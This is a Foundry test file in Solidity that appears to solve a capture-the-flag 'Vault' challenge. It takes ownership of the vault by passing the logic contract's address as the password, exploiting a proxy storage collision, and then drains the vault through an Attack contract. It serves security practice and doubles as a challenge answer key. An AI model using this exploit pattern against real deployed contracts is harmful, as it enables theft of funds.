// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/Vault.sol";
import "../src/Attack.sol";
import "forge-std/Test.sol";

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;
    Attack public attack;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));
        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

        attack = new Attack(vault);
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.
        bytes memory data = abi.encodeWithSignature(
            "changeOwner(bytes32,address)",
            bytes32(uint256(uint160(address(logic)))),
            palyer
        );
        (bool success, ) = address(vault).call(data);
        vault.openWithdraw();
        attack.attack{value: 0.1 ether}();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}
